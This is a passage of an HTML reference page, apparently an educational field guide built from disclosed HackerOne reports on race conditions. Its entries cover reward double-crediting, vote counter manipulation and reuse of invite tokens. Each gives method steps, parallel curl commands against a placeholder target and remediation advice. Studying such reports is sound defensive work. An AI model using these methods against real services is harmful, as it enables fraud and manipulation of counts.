+<p class="insight"><b>Insight —</b> Any 'one-time' resource (coupon, referral bonus, gift card, invite, withdrawal) is a race target: send N simultaneous requests and check whether the uniqueness/limit check is enforced atomically. Financial impact makes this high-value.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/157996" target="_blank" rel="noopener">hackerone.com/reports/157996</a></span><a class="src" href="#report-157996" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-165570" style="--sv:var(--sev-none)" data-sev="0" data-votes="29" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Race condition on one-time reward endpoint (double-credit)</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#165570</b> · slack · awarded · 29 votes · resolved</div>
+<div class="taxo"><span>Program <b>slack</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The account-creation survey grants a one-time credit but processes concurrent submissions without locking/idempotency, so firing the request in parallel credits the reward multiple times (TOCTOU on the 'already rewarded?' check).</p>
+<h4>Method</h4><ol><li>Reach the one-time reward action (survey completion)</li><li>Capture the request</li><li>Replay it concurrently (parallel/async, single-packet attack)</li><li>Reward is applied N times (e.g. 2 requests -&gt; $200)</li></ol>
+<div class="pre"># fire in parallel
+curl req &amp; curl req &amp;   # or Burp Turbo Intruder single-packet attack</div>
+<p class="insight"><b>Insight —</b> Any once-per-account credit/redeem/vote endpoint is a race target. Test with concurrent identical requests before the guard commits. Fix requires DB-level uniqueness/locking, not a read-then-write check.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/165570" target="_blank" rel="noopener">hackerone.com/reports/165570</a></span><a class="src" href="#report-165570" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-152717" style="--sv:var(--sev-none)" data-sev="0" data-votes="15" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Vote counter manipulation via parallel requests</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#152717</b> · urbandictionary · none · 15 votes · resolved</div>
+<div class="taxo"><span>Program <b>urbandictionary</b></span><span>Surface <b>web</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The vote endpoint checks 'already voted?' and increments the counter non-atomically, so many concurrent identical requests all pass the check and each increments, yielding arbitrary (even negative opposite) counts.</p>
+<h4>Method</h4><ol><li>Capture a single vote request</li><li>Remove your existing vote so you are eligible to vote again</li><li>Fire many copies of the vote request concurrently (curl cmd &amp; cmd &amp;, Burp Turbo Intruder, single-packet attack)</li><li>Observe the counter jump beyond one and the opposite counter go negative</li></ol>
+<div class="pre"># fire the captured vote request in parallel
+curl 'https://TARGET/vote?def=ID&amp;dir=up' &amp; curl 'https://TARGET/vote?def=ID&amp;dir=up' &amp; ...</div>
+<p class="insight"><b>Insight —</b> Any 'once per user' counter (votes, likes, redemptions, invites) is a TOCTOU target: replay the same authorized request in parallel to bypass the one-shot check. Use Burp single-packet attack for tight windows.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/152717" target="_blank" rel="noopener">hackerone.com/reports/152717</a></span><a class="src" href="#report-152717" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-119354" style="--sv:var(--sev-none)" data-sev="0" data-votes="14" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Single-use invitation token double-consumed via race</h3><span class="fieldmark">◆ Info</span></div>
+<div class="catalog">Specimen <b>#119354</b> · security · none · 14 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span><span>Chain <b>race on token consume -&gt; bypass single-use / plan limit</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Invitation acceptance reads-then-marks the token without an atomic lock, so submitting acceptance concurrently consumes one invite token more than once, authenticating multiple accounts / bypassing per-invite or plan limits.</p>
+<h4>Method</h4><ol><li>Obtain a single invitation token/link.</li><li>Submit the accept action simultaneously from two logged-in users/browsers (or via parallel requests).</li><li>Both succeed, joining on one invite; same pattern bypasses staff/seat limits.</li></ol>
+<p class="insight"><b>Insight —</b> Any single-use consumption (invites, coupons, one-time links, seat/plan limits) that isn't guarded by an atomic DB lock is racy. Use Burp single-packet / parallel requests to test; the fix is an exclusive lock around read-check-consume.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/119354" target="_blank" rel="noopener">hackerone.com/reports/119354</a></span><a class="src" href="#report-119354" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ Lab</a></div></article></div>
+    <button class="loadmore" id="loadmore">Load more specimens (18 of 42 remaining)</button>
+    <h2 class="sec" id="refs"><span class="tick">§</span>References &amp; practice</h2>
+<ol class="refs">
+<li>PortSwigger Web Security Academy — <a href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">Race conditions labs</a> (hands-on practice).</li>
+<li>All 42 disclosed reports for this class are catalogued as specimens above.</li>
+<li>See also: <a href="../chains.html">exploit chains</a> · <a href="../payloads.html">payload libraries</a> · <a href="../methodology/recon.html">methodology</a>.</li>
+</ol>
+  </main>
+  <nav class="toc" aria-label="In this entry"><h5>In this entry</h5><a href="#basic-information">Basic information</a><a href="#methodology">Methodology</a><a href="#technique-variants">Technique variants</a><a href="#redeem-claim-multiplier-single-use-credit" style="padding-left:24px">↳ Redeem / claim multiplier (single-use credit)</a><a href="#non-idempotent-state-transition-double-spend" style="padding-left:24px">↳ Non-idempotent state transition (double-spend)</a><a href="#quota-uniqueness-bypass-check-then-insert" style="padding-left:24px">↳ Quota / uniqueness bypass (check-then-insert)</a><a href="#verify-then-use-on-the-same-identifier-toctou" style="padding-left:24px">↳ Verify-then-use on the same identifier (TOCTOU)</a><a href="#provisioning-window-toctou" style="padding-left:24px">↳ Provisioning-window TOCTOU</a><a href="#dns-host-re-resolution-toctou" style="padding-left:24px">↳ DNS / host re-resolution TOCTOU</a><a href="#filesystem-stat-access-then-open-native-code" style="padding-left:24px">↳ Filesystem stat/access-then-open (native code)</a><a href="#client-side-event-race" style="padding-left:24px">↳ Client-side event race</a><a href="#bypasses">Bypasses</a><a href="#escalation-impact">Escalation &amp; impact</a><a href="#prevention">Prevention</a><a href="#tools">Tools</a><a href="#specimens">Specimens (42)</a><a href="#refs">References</a><h5 style="margin-top:22px">Practice</h5><a href="https://portswigger.net/web-security/race-conditions" target="_blank" rel="noopener">⚑ PortSwigger: Race conditions</a></nav>
+</div>
+<footer class="foot"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide — distilled from disclosed HackerOne reports for defensive, educational research. Every specimen cites <code>hackerone.com/reports/&lt;id&gt;</code>.</span></footer>
+<script src="../assets/app.js"></script></body></html>
